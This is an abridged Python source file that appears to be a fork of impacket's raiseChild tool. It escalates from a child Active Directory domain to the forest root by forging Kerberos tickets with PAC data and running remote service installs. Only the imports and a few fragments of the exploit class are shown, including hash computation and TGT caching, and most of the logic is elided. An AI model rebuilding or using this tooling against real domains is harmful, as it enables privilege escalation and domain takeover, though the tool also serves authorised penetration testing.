...
try:
    import pyasn1
     ...
     sys.exit(1)
from horizon3_impacket.impacket import version
from horizon3_impacket.impacket.krb5.types import Principal, KerberosTime
from horizon3_impacket.impacket.krb5 import constants
from horizon3_impacket.impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
from horizon3_impacket.impacket.krb5.asn1 import AS_REP, AuthorizationData, AD_IF_RELEVANT, EncTicketPart
from horizon3_impacket.impacket.krb5.crypto import Key, _enctype_table, _checksum_table, Enctype
from horizon3_impacket.impacket.dcerpc.v5.ndr import NDRULONG
from horizon3_impacket.impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from horizon3_impacket.impacket.examples import logger
from horizon3_impacket.impacket.examples.utils import parse_credentials
from horizon3_impacket.impacket.ntlm import LMOWFv1, NTOWFv1
from horizon3_impacket.impacket.dcerpc.v5.dtypes import RPC_SID, MAXIMUM_ALLOWED
from horizon3_impacket.impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from horizon3_impacket.impacket.dcerpc.v5.nrpc import MSRPC_UUID_NRPC, hDsrGetDcNameEx
from horizon3_impacket.impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, POLICY_LOOKUP_NAMES, LSAP_LOOKUP_LEVEL, hLsarLookupSids
from horizon3_impacket.impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS, hLsarOpenPolicy2
from horizon3_impacket.impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, \
    PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, VALIDATION_INFO
from horizon3_impacket.impacket.dcerpc.v5 import transport, drsuapi, epm, samr
from horizon3_impacket.impacket.smbconnection import SessionError
from horizon3_impacket.impacket.nt_errors import STATUS_NO_LOGON_SERVERS
from horizon3_impacket.impacket.smbconnection import SMBConnection, smb
from horizon3_impacket.impacket.structure import Structure
from horizon3_impacket.impacket.examples import remcomsvc, serviceinstall
...
class RAISECHILD:
            ...
            try:
                ...
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    ...
                    if childCreds['lmhash'] == '' and childCreds['nthash'] == '':
                        from horizon3_impacket.impacket.ntlm import compute_lmhash, compute_nthash
    ...
    def exploit(self):
        ...
        if self.__writeTGT is not None:
            ...
            from horizon3_impacket.impacket.krb5.ccache import CCache
            ccache = CCache()
